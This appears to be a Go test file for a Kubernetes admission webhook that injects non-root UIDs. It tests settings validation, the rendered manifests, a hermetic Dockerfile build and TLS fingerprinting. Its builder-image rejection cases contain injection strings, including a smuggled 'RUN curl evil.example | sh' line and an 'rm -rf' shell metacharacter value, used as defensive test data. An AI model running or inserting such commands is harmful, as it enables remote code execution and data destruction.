package sccadmission

import (
	"slices"
	"strconv"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"
	admissionregv1 "k8s.io/api/admissionregistration/v1"
	appsv1 "k8s.io/api/apps/v1"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/runtime"

	"github.com/stackrox/kind-ocp/assets"
	"github.com/stackrox/kind-ocp/layers"
)

func envWithSettings(t *testing.T, settingsYAML string) layers.Env {
	t.Helper()
	var m map[string]yaml.Node
	if err := yaml.Unmarshal([]byte(settingsYAML), &m); err != nil {
		t.Fatal(err)
	}
	return layers.Env{Settings: m}
}

func TestDecodeSettings(t *testing.T) {
	t.Run("defaults with no settings section", func(t *testing.T) {
		s, err := decodeSettings(layers.Env{})
		if err != nil {
			t.Fatal(err)
		}
		if len(s.WatchedNamespaces) != 1 || s.WatchedNamespaces[0] != defaultWatchedNamespace {
			t.Errorf("watchedNamespaces = %v, want the default [%s]", s.WatchedNamespaces, defaultWatchedNamespace)
		}
		if s.RunAsUser != defaultRunAsUser {
			t.Errorf("runAsUser = %d, want the default %d", s.RunAsUser, defaultRunAsUser)
		}
		if s.BuilderImage != DefaultBuilderImage {
			t.Errorf("builderImage = %q, want the default pin", s.BuilderImage)
		}
	})

	t.Run("every setting is overridable and the rest keep their defaults", func(t *testing.T) {
		s, err := decodeSettings(envWithSettings(t,
			"scc-admission:\n  watchedNamespaces: [stackrox, openshift-compliance]\n  runAsUser: 10007\n"))
		if err != nil {
			t.Fatal(err)
		}
		if len(s.WatchedNamespaces) != 2 || s.WatchedNamespaces[0] != "stackrox" || s.WatchedNamespaces[1] != "openshift-compliance" {
			t.Errorf("watchedNamespaces = %v, want the override", s.WatchedNamespaces)
		}
		if s.RunAsUser != 10007 {
			t.Errorf("runAsUser = %d, want 10007", s.RunAsUser)
		}
		if s.BuilderImage != DefaultBuilderImage {
			t.Errorf("builderImage = %q, want the default pin kept", s.BuilderImage)
		}
	})

	t.Run("unknown key is an error", func(t *testing.T) {
		_, err := decodeSettings(envWithSettings(t, "scc-admission:\n  bogus: true\n"))
		if err == nil || !strings.Contains(err.Error(), "bogus") {
			t.Fatalf("decodeSettings(unknown key) = %v, want an error naming the key", err)
		}
	})

	t.Run("empty watched list is an error", func(t *testing.T) {
		_, err := decodeSettings(envWithSettings(t, "scc-admission:\n  watchedNamespaces: []\n"))
		if err == nil || !strings.Contains(err.Error(), "watchedNamespaces") {
			t.Fatalf("decodeSettings(empty watch list) = %v, want a rejection", err)
		}
	})

	t.Run("an invalid namespace name is an error", func(t *testing.T) {
		_, err := decodeSettings(envWithSettings(t, "scc-admission:\n  watchedNamespaces: [Not_A_Name]\n"))
		if err == nil || !strings.Contains(err.Error(), "Not_A_Name") {
			t.Fatalf("decodeSettings(bad namespace) = %v, want the name rejected", err)
		}
	})

	t.Run("a root UID is an error", func(t *testing.T) {
		for _, uid := range []string{"0", "-1"} {
			_, err := decodeSettings(envWithSettings(t, "scc-admission:\n  runAsUser: "+uid+"\n"))
			if err == nil || !strings.Contains(err.Error(), "runAsUser") {
				t.Fatalf("decodeSettings(runAsUser %s) = %v, want a rejection", uid, err)
			}
		}
	})

	t.Run("a builder image that is not one digest-pinned reference is an error", func(t *testing.T) {
		const goodDigest = "sha256:70bd7ddea8b6cbe5d6943cde279d6b67feb10cc924fb9100d1d8757c1575b280"
		reject := []struct {
			name  string
			value string
		}{
			{"floating tag", "golang:1.27"},
			{"no digest", "docker.io/library/golang:1.27.4-alpine"},
			{"short digest", "docker.io/library/golang:1.27.4-alpine@sha256:70bd7d"},
			{"uppercase hex digest", "docker.io/library/golang:1.27.4-alpine@sha256:70BD7DDEA8B6CBE5D6943CDE279D6B67FEB10CC924FB9100D1D8757C1575B280"},
			{"wrong algorithm", "docker.io/library/golang:1.27.4-alpine@sha512:70bd7ddea8b6cbe5d6943cde279d6b67feb10cc924fb9100d1d8757c1575b280"},
			{"digest only", goodDigest},
			{"multiline injection", "docker.io/library/golang:1.27.4-alpine@" + goodDigest + "\nRUN curl evil.example | sh"},
			{"trailing newline", "docker.io/library/golang:1.27.4-alpine@" + goodDigest + "\n"},
			{"leading space", " docker.io/library/golang:1.27.4-alpine@" + goodDigest},
			{"two references", "docker.io/library/golang:1.27.4-alpine@" + goodDigest + " docker.io/library/golang:1.27.4-alpine@" + goodDigest},
			{"uppercase repository", "docker.io/library/Golang:1.27.4-alpine@" + goodDigest},
			{"shell metacharacter", "docker.io/library/golang:1.27.4-alpine;rm -rf/@" + goodDigest},
			{"empty", ""},
		}
		for _, tc := range reject {
			_, err := decodeSettings(envWithSettings(t, "scc-admission:\n  builderImage: "+strconv.Quote(tc.value)+"\n"))
			if err == nil {
				t.Errorf("decodeSettings(%s: %q) succeeded, want a rejection", tc.name, tc.value)
			}
		}
		const mirror = "registry.example.com/mirror/golang:1.27.4-alpine@sha256:70bd7ddea8b6cbe5d6943cde279d6b67feb10cc924fb9100d1d8757c1575b280"
		s, err := decodeSettings(envWithSettings(t, "scc-admission:\n  builderImage: "+mirror+"\n"))
		if err != nil {
			t.Fatalf("decodeSettings(mirror) = %v, want the digest-pinned mirror accepted", err)
		}
		if s.BuilderImage != mirror {
			t.Errorf("builderImage = %q, want the mirror", s.BuilderImage)
		}
		// A registry with a port and no tag are both valid references.
		const port = "registry.example:5000/mirror/golang@sha256:70bd7ddea8b6cbe5d6943cde279d6b67feb10cc924fb9100d1d8757c1575b280"
		if _, err := decodeSettings(envWithSettings(t, "scc-admission:\n  builderImage: "+port+"\n")); err != nil {
			t.Fatalf("decodeSettings(registry with port) = %v, want it accepted", err)
		}
	})
}

// The deployment sets one env variable; the webhook reads it by name.
// The two live in different packages (the webhook builds standalone),
// so this pins the contract at the source level: the embedded webhook
// must reference the name the deployment renders.
func TestWebhookEnvContract(t *testing.T) {
	if !strings.Contains(assets.SCCAdmissionWebhookMain, `"`+envRunAsUserName+`"`) {
		t.Errorf("the embedded webhook source does not read %s; the rendered deployment sets it", envRunAsUserName)
	}
	// The probe pod starts the binary with an argument to make it
	// idle; the webhook must treat any argument as that mode.
	if !strings.Contains(assets.SCCAdmissionWebhookMain, "len(os.Args) > 1") {
		t.Error("the embedded webhook source lost its argument-triggered probe mode")
	}
}

func TestNamespaceObjects(t *testing.T) {
	t.Run("the webhook namespace plus every watched one", func(t *testing.T) {
		s := defaultSettings()
		s.WatchedNamespaces = []string{"stackrox", "openshift-compliance"}
		objs := namespaceObjects(s)
		if len(objs) != 3 {
			t.Fatalf("namespaceObjects = %d objects, want 3", len(objs))
		}
		var ns corev1.Namespace
		fromUnstructured(t, objs[0], &ns)
		if ns.Name != webhookNamespace || ns.Labels != nil {
			t.Errorf("object 0 = namespace %q labels %v, want the webhook namespace (no labels: nothing selects on one)", ns.Name, ns.Labels)
		}
		for i, want := range []string{"stackrox", "openshift-compliance"} {
			fromUnstructured(t, objs[i+1], &ns)
			if ns.Name != want {
				t.Errorf("object %d = namespace %q, want %q", i+1, ns.Name, want)
			}
			if ns.Labels != nil {
				t.Errorf("namespace %q carries labels %v; the webhook's scope is the configuration, not a label to go stale", ns.Name, ns.Labels)
			}
		}
	})

	t.Run("the webhook namespace is rendered once even when watched", func(t *testing.T) {
		s := defaultSettings()
		s.WatchedNamespaces = []string{webhookNamespace, "stackrox"}
		objs := namespaceObjects(s)
		if len(objs) != 2 {
			t.Fatalf("namespaceObjects = %d objects, want 2 (the webhook namespace is not doubled)", len(objs))
		}
		var ns corev1.Namespace
		fromUnstructured(t, objs[0], &ns)
		if ns.Name != webhookNamespace {
			t.Errorf("object 0 = namespace %q, want the webhook namespace", ns.Name)
		}
	})
}

func TestRenderedObjects(t *testing.T) {
	s := defaultSettings()
	s.RunAsUser = 10007
	s.WatchedNamespaces = []string{"stackrox", "openshift-compliance"}
	const ref = "localhost/kind-ocp/scc-admission:sha256-test"
	const fingerprint = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
	caPEM := []byte("-----BEGIN CERTIFICATE-----\n…\n-----END CERTIFICATE-----\n")

	var deploy appsv1.Deployment
	fromUnstructured(t, deployment(s, ref, fingerprint), &deploy)
	t.Run("the deployment runs the local image, never pulled, non-root, carrying the TLS fingerprint", func(t *testing.T) {
		container := deploy.Spec.Template.Spec.Containers[0]
		if container.Image != ref {
			t.Errorf("image = %q, want %q", container.Image, ref)
		}
		if container.ImagePullPolicy != corev1.PullNever {
			t.Errorf("imagePullPolicy = %q, want Never", container.ImagePullPolicy)
		}
		if got := deploy.Spec.Template.Annotations[tlsFingerprintAnnotation]; got != fingerprint {
			t.Errorf("pod template annotation %s = %q, want the TLS fingerprint %q (a changed secret must change the template and roll the pods)", tlsFingerprintAnnotation, got, fingerprint)
		}
		if len(container.Env) != 1 || container.Env[0].Name != envRunAsUserName || container.Env[0].Value != "10007" {
			t.Errorf("env = %+v, want the configured UID in %s", container.Env, envRunAsUserName)
		}
		sc := deploy.Spec.Template.Spec.SecurityContext
		if sc == nil || sc.RunAsNonRoot == nil || !*sc.RunAsNonRoot || sc.RunAsUser == nil || *sc.RunAsUser == 0 {
			t.Errorf("pod securityContext = %+v, want non-root with an explicit UID", sc)
		}
		if token := deploy.Spec.Template.Spec.AutomountServiceAccountToken; token == nil || *token {
			t.Errorf("automountServiceAccountToken = %v, want false: the webhook serves admission reviews and never calls the Kubernetes API, so the default token would be a live cluster credential nothing uses", token)
		}
		if container.SecurityContext == nil ||
			container.SecurityContext.AllowPrivilegeEscalation == nil || *container.SecurityContext.AllowPrivilegeEscalation ||
			container.SecurityContext.ReadOnlyRootFilesystem == nil || !*container.SecurityContext.ReadOnlyRootFilesystem ||
			container.SecurityContext.Capabilities == nil || len(container.SecurityContext.Capabilities.Drop) == 0 {
			t.Errorf("container securityContext = %+v, want no escalation, a read-only root, and no capabilities", container.SecurityContext)
		}
		probe := container.ReadinessProbe
		if probe == nil || probe.HTTPGet == nil || probe.HTTPGet.Path != "/healthz" || probe.HTTPGet.Scheme != corev1.URISchemeHTTPS {
			t.Errorf("readinessProbe = %+v, want an HTTPS GET of /healthz", probe)
		}
		volumes := deploy.Spec.Template.Spec.Volumes
		if len(volumes) != 1 || volumes[0].Secret == nil || volumes[0].Secret.SecretName != webhookSecret {
			t.Errorf("volumes = %+v, want the TLS secret mounted", volumes)
		}
		if len(deploy.Spec.Template.Spec.Containers[0].VolumeMounts) != 1 {
			t.Errorf("volumeMounts = %+v, want the TLS mount", container.VolumeMounts)
		}
		if deploy.Namespace != webhookNamespace || deploy.Name != webhookDeployment {
			t.Errorf("deployment = %s/%s, want %s/%s", deploy.Namespace, deploy.Name, webhookNamespace, webhookDeployment)
		}
	})

	var svc corev1.Service
	fromUnstructured(t, service(), &svc)
	t.Run("the service fronts the webhook port", func(t *testing.T) {
		if svc.Name != webhookService || svc.Namespace != webhookNamespace {
			t.Errorf("service = %s/%s, want %s/%s", svc.Namespace, svc.Name, webhookNamespace, webhookService)
		}
		if len(svc.Spec.Ports) != 1 || svc.Spec.Ports[0].Port != 443 || svc.Spec.Ports[0].TargetPort.IntValue() != int(containerPort) {
			t.Errorf("ports = %+v, want 443 → %d", svc.Spec.Ports, containerPort)
		}
		if svc.Spec.Selector["app"] != webhookDeployment {
			t.Errorf("selector = %v, want the deployment's pods", svc.Spec.Selector)
		}
	})

	var mwc admissionregv1.MutatingWebhookConfiguration
	fromUnstructured(t, mutatingWebhookConfiguration(s, caPEM), &mwc)
	t.Run("the webhook configuration routes pod creates in exactly the watched namespaces", func(t *testing.T) {
		if mwc.Name != webhookConfig || len(mwc.Webhooks) != 1 {
			t.Fatalf("configuration = %q with %d webhooks, want %q with one", mwc.Name, len(mwc.Webhooks), webhookConfig)
		}
		webhook := mwc.Webhooks[0]
		if webhook.Name != webhookName {
			t.Errorf("webhook name = %q, want %q", webhook.Name, webhookName)
		}
		if webhook.FailurePolicy == nil || *webhook.FailurePolicy != admissionregv1.Ignore {
			t.Errorf("failurePolicy = %v, want Ignore (the documented trade-off)", webhook.FailurePolicy)
		}
		if webhook.SideEffects == nil || *webhook.SideEffects != admissionregv1.SideEffectClassNone {
			t.Errorf("sideEffects = %v, want None", webhook.SideEffects)
		}
		if len(webhook.AdmissionReviewVersions) != 1 || webhook.AdmissionReviewVersions[0] != "v1" {
			t.Errorf("admissionReviewVersions = %v, want [v1]", webhook.AdmissionReviewVersions)
		}
		// The scope is the built-in name label matched against the
		// configured list: a namespace removed from the list stops
		// being mutated the moment this configuration is applied —
		// there is no label to go stale.
		selector := webhook.NamespaceSelector
		if selector == nil || len(selector.MatchLabels) != 0 || len(selector.MatchExpressions) != 1 {
			t.Fatalf("namespaceSelector = %+v, want one match expression and no match labels", selector)
		}
		expr := selector.MatchExpressions[0]
		if expr.Key != "kubernetes.io/metadata.name" || expr.Operator != metav1.LabelSelectorOpIn {
			t.Errorf("match expression = %s %s %v, want the built-in name label matched with In", expr.Key, expr.Operator, expr.Values)
		}
		if !slices.Equal(expr.Values, s.WatchedNamespaces) {
			t.Errorf("match expression values = %v, want exactly the configured watched namespaces %v", expr.Values, s.WatchedNamespaces)
		}
		// The layer renders neither an objectSelector nor
		// matchConditions: both are evaluated against the incoming
		// request before the webhook is called, and either could
		// narrow which creates reach it in ways a probe in a watched
		// namespace cannot observe. The stored form may default the
		// objectSelector to empty; the rendered form leaves both
		// unset.
		if sel := webhook.ObjectSelector; sel != nil && (len(sel.MatchLabels) != 0 || len(sel.MatchExpressions) != 0) {
			t.Errorf("objectSelector = %+v, want none rendered", sel)
		}
		if len(webhook.MatchConditions) != 0 {
			t.Errorf("matchConditions = %+v, want none rendered", webhook.MatchConditions)
		}
		if len(webhook.Rules) != 1 ||
			webhook.Rules[0].Operations[0] != admissionregv1.Create ||
			webhook.Rules[0].Resources[0] != "pods" || webhook.Rules[0].APIGroups[0] != "" {
			t.Errorf("rules = %+v, want pod CREATE in the core group", webhook.Rules)
		}
		cc := webhook.ClientConfig
		if cc.Service == nil || cc.Service.Name != webhookService || cc.Service.Namespace != webhookNamespace ||
			cc.Service.Path == nil || *cc.Service.Path != "/mutate" {
			t.Errorf("clientConfig.service = %+v, want the webhook service at /mutate", cc.Service)
		}
		if string(cc.CABundle) != string(caPEM) {
			t.Error("caBundle does not carry the CA it was rendered with")
		}
	})

	t.Run("the probe pod mounts no ServiceAccount token", func(t *testing.T) {
		// Round-tripped through the unstructured form, so a field the
		// serialization dropped cannot pass the assertion.
		var pod corev1.Pod
		fromUnstructured(t, mustUnstructured(probePod("kind-ocp-scc-probe-01234567", "this-attempts-token", ref)), &pod)
		if token := pod.Spec.AutomountServiceAccountToken; token == nil || *token {
			t.Errorf("automountServiceAccountToken = %v, want false: the probe never calls the Kubernetes API, so the default token would be a live cluster credential nothing uses", token)
		}
		if pod.Spec.RestartPolicy != corev1.RestartPolicyNever {
			t.Errorf("restartPolicy = %q, want Never", pod.Spec.RestartPolicy)
		}
		if pod.Spec.SecurityContext == nil || pod.Spec.SecurityContext.RunAsNonRoot == nil || !*pod.Spec.SecurityContext.RunAsNonRoot {
			t.Errorf("pod securityContext = %+v, want runAsNonRoot with no UID of its own (the shape the webhook exists to admit)", pod.Spec.SecurityContext)
		}
		if pod.Spec.SecurityContext.RunAsUser != nil {
			t.Errorf("runAsUser = %d, want none (the probe proves the webhook injects one)", *pod.Spec.SecurityContext.RunAsUser)
		}
		container := pod.Spec.Containers[0]
		if container.Image != ref || container.ImagePullPolicy != corev1.PullNever {
			t.Errorf("container = %+v, want the local image never pulled", container)
		}
		if pod.Labels[probeLabelKey] != probeLabelValue || pod.Labels[probeAttemptLabelKey] != "this-attempts-token" {
			t.Errorf("labels = %v, want the static probe label and the attempt token", pod.Labels)
		}
	})
}

func TestBuildContext(t *testing.T) {
	s := defaultSettings()
	ctxFiles := buildContext(s)

	t.Run("carries the rendered Dockerfile, the module file, and the embedded source", func(t *testing.T) {
		for _, name := range []string{"Dockerfile", "go.mod", "main.go", "patch.go"} {
			if len(ctxFiles[name]) == 0 {
				t.Errorf("the build context carries no %s", name)
			}
		}
		if string(ctxFiles["main.go"]) != assets.SCCAdmissionWebhookMain {
			t.Error("main.go is not the embedded webhook source")
		}
		if string(ctxFiles["patch.go"]) != assets.SCCAdmissionWebhookPatch {
			t.Error("patch.go is not the embedded webhook source")
		}
	})

	t.Run("the Dockerfile pins the builder and builds hermetically", func(t *testing.T) {
		dockerfile := string(ctxFiles["Dockerfile"])
		for _, want := range []string{
			"FROM " + s.BuilderImage + " AS build",
			"CGO_ENABLED=0",
			"GOPROXY=off",
			"GOTOOLCHAIN=local",
			"go build -trimpath",
			"FROM scratch",
		} {
			if !strings.Contains(dockerfile, want) {
				t.Errorf("the Dockerfile does not contain %q:\n%s", want, dockerfile)
			}
		}
		// The builder pin in the Dockerfile is the setting's, so an
		// override changes the build, not just the setting.
		overridden := buildContext(settings{
			BuilderImage: "registry.example.com/mirror/golang:1.27.4-alpine@sha256:70bd7ddea8b6cbe5d6943cde279d6b67feb10cc924fb9100d1d8757c1575b280",
		})
		if !strings.Contains(string(overridden["Dockerfile"]), "FROM registry.example.com/mirror/golang:1.27.4-alpine@sha256:") {
			t.Error("a builder override did not change the rendered Dockerfile")
		}
	})

	t.Run("the module file matches the pinned builder's toolchain", func(t *testing.T) {
		gomod := string(ctxFiles["go.mod"])
		if !strings.Contains(gomod, "module scc-admission-webhook") || !strings.Contains(gomod, "go 1.27") {
			t.Errorf("go.mod = %q, want the standalone module with a 1.27 directive", gomod)
		}
		if !strings.Contains(DefaultBuilderImage, "golang:1.27") {
			t.Errorf("DefaultBuilderImage = %q, want the 1.27 toolchain matching go.mod", DefaultBuilderImage)
		}
	})
}

func TestImageRef(t *testing.T) {
	s := defaultSettings()
	ref := imageRef(s)
	if !strings.HasPrefix(ref, "localhost/kind-ocp/scc-admission:sha256-") {
		t.Errorf("imageRef = %q, want the local reference with a content-hash tag", ref)
	}
	if imageRef(s) != ref {
		t.Error("imageRef is not deterministic for the same inputs")
	}
	if len(imageRef(s)) != len("sha256-")+len("localhost/kind-ocp/scc-admission:")+16 {
		t.Errorf("imageRef = %q, want a 16-hex-character tag", ref)
	}
	// A different builder pin is a different image: the reference
	// changes exactly when what goes into the image changes.
	other := defaultSettings()
	other.BuilderImage = "registry.example.com/mirror/golang:1.27.4-alpine@sha256:0000000000000000000000000000000000000000000000000000000000000000"
	if imageRef(other) == ref {
		t.Error("a different builder pin produced the same image reference")
	}
}

// tlsFingerprint is the deployment's roll trigger: it must be
// deterministic for the same material, change when any field of the
// secret changes, and not depend on map iteration order.
func TestTLSFingerprint(t *testing.T) {
	data := map[string][]byte{
		secretCAKey: []byte("ca"),
		"tls.crt":   []byte("crt"),
		"tls.key":   []byte("key"),
	}
	got := tlsFingerprint(data)
	if len(got) != 64 {
		t.Fatalf("tlsFingerprint = %q, want a 64-hex-character SHA-256", got)
	}
	// Same content under a rebuilt map (different backing order) is
	// the same fingerprint.
	rebuilt := map[string][]byte{"tls.key": []byte("key"), "tls.crt": []byte("crt"), secretCAKey: []byte("ca")}
	if tlsFingerprint(rebuilt) != got {
		t.Error("tlsFingerprint depends on map iteration order, not just content")
	}
	for _, field := range []string{secretCAKey, "tls.crt", "tls.key"} {
		changed := map[string][]byte{}
		for k, v := range data {
			changed[k] = v
		}
		changed[field] = []byte("changed")
		if tlsFingerprint(changed) == got {
			t.Errorf("tlsFingerprint ignores %s; a changed secret must change the deployment template", field)
		}
	}
}

// fromUnstructured converts a rendered object back to its typed form
// for field-by-field assertions.
func fromUnstructured(t *testing.T, obj *unstructured.Unstructured, into any) {
	t.Helper()
	if err := runtime.DefaultUnstructuredConverter.FromUnstructured(obj.Object, into); err != nil {
		t.Fatalf("converting %T: %v", obj, err)
	}
}
